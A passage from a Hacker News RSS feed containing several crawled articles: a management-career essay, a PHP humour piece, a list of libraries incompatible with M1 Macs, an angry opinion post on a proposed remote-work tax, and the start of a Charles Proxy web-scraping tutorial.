<figure><img loading="lazy" width="1024" height="650" src="http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-1024x650.jpg" alt="" srcset="http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-1024x650.jpg 1024w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-300x190.jpg 300w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-768x487.jpg 768w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-850x539.jpg 850w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D.jpg 1400w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>There are numerous forecasts calling for lower activity in sunspots, but that’s only a prediction. Regardless, HF propagation will only be getting better for many years to come. Time to dust off that long wire and fire up that amplifier!&nbsp;</p>








<br>
			</div><!-- .entry-content -->
</article></div>]]>
            </description>
            <link>http://k0lwc.com/solar-cycle-25-has-officially-begun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071342</guid>
            <pubDate>Thu, 12 Nov 2020 16:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fear of Becoming a Manager]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25071270">thread link</a>) | @eduardsi
<br/>
November 12, 2020 | https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/ | <a href="https://web.archive.org/web/*/https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
    
    
  
  <h6>
      November 2020 · Riga, Latvia · <a href="https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/#disqus_thread">comments</a>
  </h6>  
  

  <section>
    <p>As a developer, when I was offered a management job for the first time, my biggest fear was that it would make me a bad programmer because my programming skills and my market competitiveness as a programmer will decline. While talking to young team leaders and tech managers, I discovered that I am not alone.</p>

<p>Fear of having no time for coding stops many good programmers from filling management roles and positively influencing strategic areas of the organization: people, process, enterprise architecture, etc. When developers don’t see themselves as future organization leaders and managers, they stop learning and caring about topics paramount to good management: Lean, Kanban, Change Management, Psychology, Motivation, Systems Thinking.</p>

<figure>
<img src="https://sizovs.net/images/donella.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

<p>With knowledge gaps in those areas, we, developers, can’t be in charge of development process. Moreover, we can’t even help people in charge make better, informed decisions. No wonder why developers are rarely invited to non-technical, yet strategically important meetings.</p>

<p>So, by “staying technical” and giving up power to non-technical managers or the least competent developers, good developers are digging themselves a hole. Sitting in that hole, they complain about how bad the leaders, managers, and their created processes are.</p>

<p>Now, let me share some good news with you.</p>

<h3 id="becoming-a-manager-makes-you-a-better-programmer">Becoming a manager makes you a <em>better</em> programmer.</h3>

<p>As a manager, you’ll learn new skills that never get out of date, including communication, delegation, motivation, planning. You’ll learn how to deal with different (and difficult) stakeholders, balance conflicting interests, and reach an agreement. By spending more time next to business people, you’ll better understand their concerns and prepare yourself for running your own company.</p>

<p>Even if you prefer staying employed and “solely technical”, timeless managerial skills will serve you well, because you’ll gain an entirely new perspective on programming: you’ll see it through the manager’s lens. You’ll learn that estimates are <del>evil</del> an essential aspect of financial planning. When putting pressure, good managers expect productive confrontation, not immediate compliance. And that we – engineers – are tough nuts.</p>

<p>With that extra perspective, finding common ground, and reaching an agreement with other managers becomes easier. Finally, you’ll understand that management is not a walk in the park and start empathizing with and helping other managers.</p>

<h3 id="management-experience-opens-new-doors">Management experience opens new doors</h3>

<p>Having any leadership and management experience makes you prepared for more senior roles, such as Engineering Manager, VPoE, or CTO. Finding the right candidate to fill those roles is mission impossible. By having the necessary skills and experience, you’re entering the gold market area with <strong>high demand</strong> and <strong>low competition</strong>. In simple terms, you are now dictating your own rules of the game. And, as the number of programmers increases with incredible speed every year, someone has to manage and lead this non-trivial engineering show.</p>

<h3 id="management-is-power">Management is power</h3>

<p>Management not only comes with a bag of extra responsibilities but also <strong>power</strong> to influence things around you. With great power comes great responsibility, but if you use your authority wisely, <em>finally</em> you can create an environment that you and your colleagues will enjoy. When I became an IT manager, the opportunity to change things according to my values and beliefs, was the main selling point. And because I had enough freedom to manage my time and set my own priorities, I was devoting most of my time to building a no-bullshit engineering culture, hiring and growing great engineers, as well as building my personal brand via public speaking. A big win for my employer also became my personal success story, and I am proud of what we’ve achieved then. When you dare to take the lead, you can create things you’ll be proud of.</p>

<p>Oh, how many things I did wrong. Every day, I experimented with the process, failing and learning from my failures, all in the “safe” environment, while receiving a decent salary and bonuses. Today, as a business owner, I don’t have the luxury of learning at someone else’s expense.</p>

<h3 id="management-helps-you-understand-yourself-better">Management helps you understand yourself better</h3>
<p>To discover your Element – the point at which your natural talent meets personal passion – you have to try different things in your life, including working with different companies, different people, and wearing different hats. For a fulfilling life and career, knowing what you like is equally important as knowing what you don’t. Before you try management, you’ll never know how it’s going to make you feel. What if you’re the next Jack Welch, hiding under a React t-shirt?</p>

<p>Before I tried management, I hated the idea of becoming a manager. While my colleagues encouraged me to go for it, I looked for excuses and arguments for “staying technical.” Then I imagined my company hiring a Bill Lumbergh who’ll be in charge of my team.</p>

<figure>
<img src="https://sizovs.net/images/bill.jpg">
<figcaption>So, Eduards, what's happening?</figcaption>
</figure>

<p>Then I told myself: “it’s better me than Bill.”</p>

<p>Six months was the “probation period” I gave myself before making the final commitment. Treating the role switch as a temporary experiment, not a permanent career change, made me feel safer. In only six months, I have formed my opinion about management, gained some practical, CV-boosting super skills, and invaluable life experience. So, what seemed like a bad idea in theory, turned out an existing and life-changing journey in practice. I fell in love with management and even started <a href="https://sizovs.net/about/#courses">teaching</a> the principles of good management to developers.</p>

<h3 id="management-is-compatible-with-coding">Management is compatible with coding</h3>

<p>Finally, you <strong>can</strong> combine management with coding. Stopping coding is a personal choice, not a necessity. I think it’s a capital mistake to polish your coding skills for years and then just throw them into a bin. If you mastered a hard skill such as coding – protect it at all costs. Management skills should complement your hard skills, not replace them. Remember: trust is the management currency, and gaining full developers’ trust is only possible if you’re a competent software developer.</p>

<p>But how do you find time for coding?</p>

<p>Firstly, you can free up time for coding by <strong>delegating</strong> some management duties to others. If you’re trying to manage everything yourself, it’s a signal of bad management. Management 3.0 book will teach you how to create an environment where management duties are distributed among people in the organization:</p>

<figure>
<img src="https://sizovs.net/images/m30.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

<p>But don’t fall into the trap of becoming an individual contributor again. Remember that as a manager, your output is the output of your team. You should be coding strategically. For example, to better understand the system’s quality, you can do a short pair programming session. Or organize a mob programming session to inspire or teach a group of people. Or just quickly hack a prototype to demonstrate a new business idea to customers. Your mileage might vary, but if you’re coding more than managing, it’s a warning signal.</p>

<p>Secondly, <strong>maintaining</strong> existing coding skills is easier than <strong>improving</strong> coding skills. As a manager, unlikely you’ll coding skills will improve, but you can easily stay at the same level.</p>

<p>For me, coding ~8 hours a week was more than enough to stay in good shape. I believe that with proper time planning and delegation, every developer can find those critical eight hours. There were periods in my life when I was overwhelmed at work, so I was writing code for my pet projects on weekends. Later I developed a simple rule: at work, I devote 80% of the time to management and leadership, 20% to programming. It’s possible, and it works.</p>

<p>Moreover, having less time for coding forced me to <a href="https://sizovs.net/2018/12/17/stop-learning-frameworks/">reconsider my learning strategy</a>.</p>

<h3 id="wrap-up">Wrap up</h3>

<p>The Dilbert Principle is real: good programmers are managed by bad programmers and software development processes are organized by clueless MBA wolves. Our industry, companies, and teams need competent leaders and managers with a programming background. If we – programmers – don’t want (or don’t know) how to lead and manage the development process, someone else will do this for us.</p>

<p>There is no good software without good management.</p>

<p>If you’re a good programmer – don’t be afraid of management. Learn management. Try management. And remember that trying is 100% risk-free: you can always return to programming… equipped with management skills.</p>

  </section>


</article></div>]]>
            </description>
            <link>https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071270</guid>
            <pubDate>Thu, 12 Nov 2020 16:06:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2.25 Years to Make $1,100 in Software Revenue]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071194">thread link</a>) | @stephen_greet
<br/>
November 12, 2020 | https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue | <a href="https://web.archive.org/web/*/https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071194</guid>
            <pubDate>Thu, 12 Nov 2020 15:59:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If PHP Were British (2011)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071058">thread link</a>) | @susam
<br/>
November 12, 2020 | https://aloneonahill.com/blog/if-php-were-british/ | <a href="https://web.archive.org/web/*/https://aloneonahill.com/blog/if-php-were-british/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_wide"><div id="content_wide_inner">

    <div id="article">
        <!-- google_ad_section_start -->

    <div>                     <p><img src="https://aloneonahill.com/images/uk_flag.jpg"></p><p>When <a href="http://toys.lerdorf.com/">Rasmus Lerdorf</a> first put <a href="http://www.php.net/">PHP</a> together, he - quite sensibly, despite his heritage - chose not to write it in Greenlandic or Danish. Good job too - that would have been rather unpleasant to work with. He opted instead, being in Canada, for a more local tongue. No, not French. Not Canadian English either. No, he went for that bastard dialect of the Queen's English commonly referred to as "US English".</p>
<p>PHP developers in Britain have been grumpy about this ever since. What was he thinking? And more importantly, how do we undo this travesty? How do we developers ensure the traditions of the British Empire continue to be upheld, even in the digital age?</p>
<h3>A Slap in the Face</h3>
<pre>$variable_name</pre>
<p>The first, but maybe the most important, of many changes that will allow PHP to achieve a more elegant feel is to remove that symbol so beloved by the US and replace it with something altogether more refined. More solid. More ... sterling.</p>
<pre>£variable_name</pre>
<h3>Getting Started</h3>
<pre>&lt;?php
    echo 'Hello World!';
?&gt;</pre>
<p>How many of today's British programmers have been put off at the outset by the brazen informality of this simple yet obscenely Americanised program, colloquially referred to as "Hello World"? A more Imperial, formal introduction might encourage a greater proportion of young British talent to remain with the language and thus give the broader community a more urbane air.</p>
<pre>&lt;?php
    announce 'Good morrow, fellow subjects of the Crown.';
?&gt;</pre>
<h3>Abbreviations</h3>
<p>Few things are more abhorrent to the British than unnecessary abbreviations. "Text speak" is unheard of on the streets of London, as the natural ingrained British grammarian simply refuses to stoop to sending messages of the "c u soon traffic kthxbye" variety, instead proferring something altogether more elegant: "Dear Sir/Madam. I will arrive as soon as time allows, which I expect to be within the hour. I assure you the horses shall not be spared. Yours respectfully." (slower to type, yes, but we do not like to be rushed).</p>
<p>PHP, on the other hand, is full to bursting with abbreviations and acronyms which are entirely unnecessary:</p>
<pre>str_replace()
is_int()
var_dump()
preg_match()
json_encode()
mysql_connect()</pre>
<p>The following changes should improve things:</p>
<pre>string_replace()
is_integer()
variable_dump()
perl_regular_expression_match()
javascript_object_notation_encode()
my_structured_query_language_connect()</pre>
<p><em>Edit: I have corrected the expansion of "preg_match" - thanks to those who pointed it out.</em></p>
<h3>Eloquence</h3>
<pre>if ($condition) {
    // Code here
} else {
    // Code here
}</pre>
<p>Shakespeare would be ashamed to see his native tongue twisted into this monstrosity. Brevity is to be applauded in the right context - in some dark corner, where it shall be seldom seen - but not here. The if ... else block is the most used conditional code in all of PHP, so it must be made as inoffensive as possible. There are many options for its replacement, but this may be the strongest:</p>
<pre>perchance (£condition) {
    // Code here
} otherwise {
    // Code here
}</pre>
<p>The same naturally applies to the Americanised switch ... case construct, which one can only describe as clunky and unpleasant:</p>
<pre>switch ($variable) {
    case $option1:
        //Code here
        break;
    case $option2:
        //Code here
        break;
    default:
        //Code here
        break;
}</pre>
<p>Words such as "switch", "break" and "default" are hard on the reader and lack context. The Right Honourable <a href="https://www.reddit.com/r/proper/comments/jp1yf/for_the_consideration_of_my_most_respectable/c2dz9zc">biggerthancheeses</a> was kind enough to contribute a more gentrified suggestion (and has some interesting ideas, particularly around replacement of "include()" with something like "i_might_be_partial_to()", demonstrating a natural talent for the Imperialisation of programming languages):</p>
<pre>what_about (£variable) {
    perhaps £possibility:
        //Code here
        splendid;
    perhaps £other_possibility:
        //Code here
        splendid;
    on_the_off_chance:
        //Code here
        splendid;
}</pre>
<h3>Spelling</h3>
<pre>imagecolorallocate()
serialize()
newt_centered_window()
connection_status()</pre>
<p>Words fail me at this point. How is any self-respecting gentleman expected to make head or tail of these "words". It beggars belief that anyone could allow such distortions of words to be entered into a programming language. They, along with the cornucopia of similar errors, should be reverted to their proper forms immediately:</p>
<pre>imagecolourallocate()
serialise()
newt_centred_window()
connexion_status()<sup><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#note1" id="notelink1">1</a></sup></pre>
<h3>Manners</h3>
<pre>try {
    // Code here
} catch (Exception $e) {
    // Handle exception
    die('Message');
}</pre>
<p>The try ... catch block is an excellent example of PHP's lack of manners. Far too direct to be allowed in the new PHP. Additionally, the word "die" is so very depressing. This new block, although more verbose, is vastly more polite and upbeat:</p>
<pre>would_you_mind {
    // Code here
} actually_i_do_mind (Exception £e) {
    // Politely move on
    cheerio('Message');
}</pre>
<h3>Class</h3>
<p>Perhaps nothing is as important and ingrained in the British psyche as the notion of class and, while there are few opportunities for change within this part of PHP, the changes that there are to be made here are important.</p>
<pre>class Republic {
    public $a;
    private $b;
    protected $c;
}
$example = new Republic();</pre>
<p>To begin with, the current system has no place for class hierarchy and this is unacceptable. So we shall begin by giving classes specific levels - upper, middle, working - and no class can access the methods of one of a higher level without the explicit permission of the higher order class (of course, though it might then have access, it would not be a true member of the higher order and could not itself grant higher order access to other lower order classes). "Public" and "Private", in the British class system, are often synonymous (see, for example, school system nomenclature), so these must be adjusted, as should the "Protected" property visibility. The word "new", while passable, has a much more appropriate replacement in matters of class.</p>
<pre>upper_class Empire {
    state £a;
    private £b;
    hereditary £c;
}
£example = nouveau Empire();</pre>
<h3>The Sun Never Sets ...</h3>
<p>It is hoped that these few simple changes will improve the reputation and status of PHP among other languages. No longer will it be the poor American cousin - instead it can take its rightful place as the - British - King of the scripting languages.</p>
<h3>Thanks</h3>
<p>Many thanks to <a href="https://twitter.com/#!/markwallman">Mark</a> and <a href="https://twitter.com/#!/bluevurt">Pat</a>, former colleagues, who helped start this resurrection of the British Empire in the pub on Friday.</p>
<p><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#notelink1" id="note1">1</a>. Yes, <a href="https://en.wikipedia.org/wiki/American_and_British_English_spelling_differences#-xion.2C_-ction">connexion</a>.</p>

    <p>
      <i></i> <span>20 August 2011</span> &nbsp; | &nbsp; <i></i>          <a href="https://aloneonahill.com/blog/?tag=php">php</a>,          <a href="https://aloneonahill.com/blog/?tag=development">development</a>,          <a href="https://aloneonahill.com/blog/?tag=humour">humour</a>,          <a href="https://aloneonahill.com/blog/?tag=empire">empire</a>    </p>

    
    
    



















    </div>

        <!-- /sidebar -->

        <!-- google_ad_section_end -->
              </div>

    </div></div></div>]]>
            </description>
            <link>https://aloneonahill.com/blog/if-php-were-british/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071058</guid>
            <pubDate>Thu, 12 Nov 2020 15:47:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libraries that don't run on the new MBPs yet]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071022">thread link</a>) | @RikNieu
<br/>
November 12, 2020 | https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/ | <a href="https://web.archive.org/web/*/https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>(Photo by <a href="https://unsplash.com/@tma?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Tianyi Ma</a> on <a href="https://unsplash.com/s/photos/macbook?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a>)</p><p>Even though I have my issues with Apple's MacBooks(DONGLES!), I'm still pretty excited for the new ARM-based MacBook Pro. My current machine is nearing the end of its life, and I am on the prowl for an updated one.</p><p>And with <a href="https://www.macrumors.com/2020/11/11/m1-macbook-air-first-benchmark/">posts like this one by MacRumors</a>, indicating that the freaking ARM MacBook Air will outperform any existing Mac on a single-core, and on multi-core it wipes the floor with all of the 2019 16-inch MacBook Pros, I'm really blown away by the possible performance increases the new MacBook Pro would offer!</p><p>But beneath my excitement for the much-touted performance and battery-life improvements lurks the potential compatibility issues that switching to new silicon could bring. </p><p>Will I spend the money equivalent to a small countries GDP, and then sit with a spoiled-brat machine refusing to work with the icky libraries and tools I use on a daily basis? Also, would stuff I code on an ARM MBP work on my Intel &amp; Linux servers?</p><p>Well, other developers have been wondering the same, and someone started a helpful <a href="https://github.com/Homebrew/brew/issues/7857">issues thread on the Homebrew Github</a>, with a list of popular libraries and tools, and if they work on the new Macs.</p><p>Here's 10 tools and libraries that, as-of 12 Nov 2020, are still not fully supported yet.</p><ul><li><strong>Bash</strong></li><li><strong>Cask</strong></li><li><strong>Cocoapods</strong></li><li><strong>Numpy</strong></li><li><strong>Docker</strong></li><li><strong>Openjdk (Gradle, Elasticsearch, React-Native, Android, Jenkins, Maven)</strong></li><li><strong>Go (Kubernetes)</strong></li><li><strong>MySQL</strong></li><li><strong>Postgress</strong></li><li><strong> Zsh</strong></li></ul><p>Those would be crucial to get working before I'd seriously consider forking out the cash for a new Mac. Let's watch this space.</p><p>Thanks for reading. If you have any comments or suggestions, follow and contact me on Twitter <a href="https://twitter.com/riknieu">@RikNieu</a>.</p><p>If you want to read more of my rants, sign up below and I'll mail you when I post new stuff. 👇</p>
			</section></div>]]>
            </description>
            <link>https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071022</guid>
            <pubDate>Thu, 12 Nov 2020 15:43:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Staff ‘should pay more tax’ says Deutsche Bank]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071015">thread link</a>) | @kiraleighleigh
<br/>
November 12, 2020 | https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/ | <a href="https://web.archive.org/web/*/https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<div>
		<!-- Start Article -->
				<article>		
						<div id="post-1366">
				<div>
					<!-- Start Content -->
					<div id="content">
					<header>
						<!-- Start Title -->
						
						<!-- End Title -->
						<p>Posted On November 12, 2020</p>

					</header>

						
<p>Actual muppets <a href="https://www.theguardian.com/business/deutschebank">Deutsche Bank</a> propose charging staff who work from home after the pandemic <strong>5% for each day</strong> they work remotely, states <a rel="noreferrer noopener" href="https://www.theguardian.com/business/2020/nov/11/staff-who-work-from-home-after-pandemic-should-pay-more-tax" target="_blank">recent bonkersville article</a> by Joanna Partridge. </p>



<p>Douche Bank posits that the average WFH employee won’t be negatively impacted, because what they save by not commuting or buying overpriced Starbucks sandwiches will even out, somehow.</p>



<blockquote><p>The report from the German lender’s economic research unit has calculated that such a tax could raise $49bn (£37bn) a year in the United States, €20bn (£17.8bn) in Germany and £7bn in the UK.&nbsp;</p></blockquote>



<p>They suggest this could go to help lower income workers by giving them a leg up. Stunningly, their suggestion to push this tax onto employers comes as an afterthought, and there’s no mention of <a rel="noreferrer noopener" href="https://uspirg.org/sites/pirg/files/cpn/USN-011218-B2-REPORT/Offshore-Shell-Games_3.html" target="_blank">offshore shell games</a>, tax loopholes, or <a href="https://www.cnbc.com/2020/02/04/amazon-had-to-pay-federal-income-taxes-for-the-first-time-since-2016.html#:~:text=After%20two%20straight%20years%20of,an%20SEC%20filing%20on%20Thursday.&amp;text=In%202018%2C%20Amazon%20posted%20income,paid%20%240%20in%20federal%20taxes." data-type="URL" data-id="https://www.cnbc.com/2020/02/04/amazon-had-to-pay-federal-income-taxes-for-the-first-time-since-2016.html#:~:text=After%20two%20straight%20years%20of,an%20SEC%20filing%20on%20Thursday.&amp;text=In%202018%2C%20Amazon%20posted%20income,paid%20%240%20in%20federal%20taxes.">forcing big companies to pay their fair share</a> in taxes.</p>



<p>Never you mind that, specifically Americans, <a rel="noreferrer noopener" href="https://www.cnbc.com/2019/03/14/heres-how-many-americans-are-not-saving-any-money-for-emergencies-or-retirement-at-all.html#:~:text=After%20all%2C%2069%20percent%20of,annual%20income%2C%E2%80%9D%20Bankrate%20reports." target="_blank">save less than 10% of their income</a>, and <a rel="noreferrer noopener" href="https://finance.yahoo.com/news/58-americans-less-1-000-090000503.html" target="_blank">58% of Americans have less than $1k saved in the bank</a>. </p>



<p>Let’s force the people, yet again, to step in for what businesses should already be doing (paying people for the work-risk and their commutes and committing to pay people more), and what governments should already be doing (stimulus stimulus STIMULUS), because heaven forbid anybody saves any money at all, ever.</p>



<p>Amidst a pandemic, that is crushing so many actual people, and helping literal dragons, this not only sounds absolutely bonkers, but tone-deaf as all fuck. </p>



<blockquote><p>“A big chunk of people have disconnected themselves from the face-to-face world yet are still leading a full economic life. That means remote workers are contributing less to the infrastructure of the economy whilst still receiving its benefits. That is a big problem for the economy.”</p></blockquote>



<p>The ridiculousness of saying remote workers are “contributing less to the infrastructure of the economy” is absolutely stunning when you consider that actual dragons have managed to grow <a rel="noreferrer noopener" href="https://www.businessinsider.com/billionaires-net-worth-increases-coronavirus-pandemic-2020-7" target="_blank">$637 billion dollars richer during COVID-19</a> so far.</p>



<blockquote><p>A daily 5% working from home tax would cost an employee earning £35,000 just under £7 a day, according to Templeman’s calculations. He suggests the £6.9bn raised in the UK by taxing remote workers could provide a grant of £2,000 to the 12% of people aged over 25 who earn the minimum wage.</p></blockquote>



<p>The absolute audacity to suggest remote workers take on this burden, versus suggesting minimum wage itself be raised, is actually giving me emotional hemorrhoids. </p>



<p>The powerful will look for any goddamn way possible to get out of raising the minimum wage, giving more cash to people who have to potentially expose themselves to COVID-19 in their workplace, or helping those with lower income from their own goddamn pockets.</p>



<p>They will do absolutely anything for this purpose. They will displace the responsibility, and place blame on the shoulders of people who, yes, are also trying to survive. </p>



<p>They will get actual Douche Banks to speak for them. They will completely ignore the <a rel="noreferrer noopener" href="https://www.scientificamerican.com/article/commuting-takes-its-toll/#:~:text=Several%20studies%20have%20shown%20that,problems%20and%20high%20blood%20pressure." target="_blank">mental health strain of long commutes</a>. </p>



<p>They will do anything in their power to not actually put in real effort, such as whole-ass slapping employers until they do the right thing.</p>



<p>As late stage capitalism strikes yet again, where human beings are only important insofar as they consume consume, consume, I cannot help but feel like someone with a grasp on our dire circumstances, a smidgen of empathy, and an understanding of what capitalism is actually about, should have warned Douchecanoe McBank that this was Not The Way.</p>



<p>Silly me, thinking that a Bank’s financial study would do anything more than lovingly shine a boot, to therein lodge it so firmly down its own esophagus, as to crap it out the other side.</p>



<p>Silly me, thinking that the responsibility to provide for those who are placed in harm’s way should be footed by the people who place them in harm’s way for profits.</p>



<p>Silly. Fucking. Me.</p>
<p>Hits: 208</p>
																		<!-- Start Tags -->
						
						<!-- End Tags -->
											</div><!-- End Content -->
					  
								  
								
<!-- You can start editing here. -->
			
							</div>
						</div>
									</article>
				<!-- End Article -->
				<!-- Start Sidebar -->
				
				<!-- End Sidebar -->
			</div>
		</div></div>]]>
            </description>
            <link>https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071015</guid>
            <pubDate>Thu, 12 Nov 2020 15:42:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charles Proxy for Web Scraping]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25070934">thread link</a>) | @daolf
<br/>
November 12, 2020 | https://www.scrapingbee.com/blog/charles-proxy/ | <a href="https://web.archive.org/web/*/https://www.scrapingbee.com/blog/charles-proxy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><img src="https://d33wubrfki0l68.cloudfront.net/0c341714fac1e681a51f25db8d80853d341830a9/c3aea/images/authors/kevin.png" alt="Kevin Sahin">
            
            <span>
                
                
                
                <span>
                    <small> ● </small>
                    
                    
                    <span>12 November, 2020</span>
                    
                    <small> ● </small>
                    <span> 10 min read </span>
                </span>
                <p> Kevin has been working in the web scraping industry for 10 years before co-founding <a href="https://www.scrapingbee.com/">ScrapingBee</a>. He is also the author of the Java Web Scraping Handbook.
                        
                        <a href="https://twitter.com/SahinKevin" target="_blank">
                        <svg style="height: 14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" fill="currentColor"></path>
                        </svg>
                        </a>
                        
                        
                    </p>
            </span>
        </p><div property="articleBody">
          





















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
      
      " src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg" width="1200" height="628" alt="Charles proxy for web scraping" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg">
  
</p></div>




<p>Charles proxy is an HTTP debugging proxy that can inspect network calls and debug SSL traffic. With Charles, you are able to inspect requests/responses, headers and cookies. Today we will see how to set up Charles, and how we can use Charles proxy for web scraping. We will focus on extracting data from Javascript-heavy web pages and mobile applications. Charles sits between your applications and the internet:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png" width="759" height="419" alt="Charles proxy drawing" data-src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png">
  
</p></div>




<p>Charles is like the Chrome dev tools on steroids. It has many incredible features:</p>
<ul>
<li>Bandwidth throttling to emulate slow internet connection</li>
<li>Request editing (the test the behavior of a back-end API for example)</li>
<li>Repeat requests</li>
<li>Full-text search on a list of request (very interesting for web-scraping)</li>
<li>Many more</li>
</ul>
<p>Charles is a very interesting tool when debugging Single Page application or mobile applications.</p>
<h2 id="installation-and-setup">Installation and set-up</h2>
<p>We are going to see how to install and configure Charles on macOS, but there is also a Windows and Linux version.</p>
<p>First visit <a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a> and download Charles.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png" width="758" height="568" alt="Charles Installation Screen" data-src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png">
  
</p></div>

<figcaption>
    <small> <em> Network tab of your browser developer console </em> </small>
</figcaption>


<p>After installing Charles, you need to install its root certificate. This will allow Charles to intercept and decrypt the SSL traffic.</p>






















<div>
  
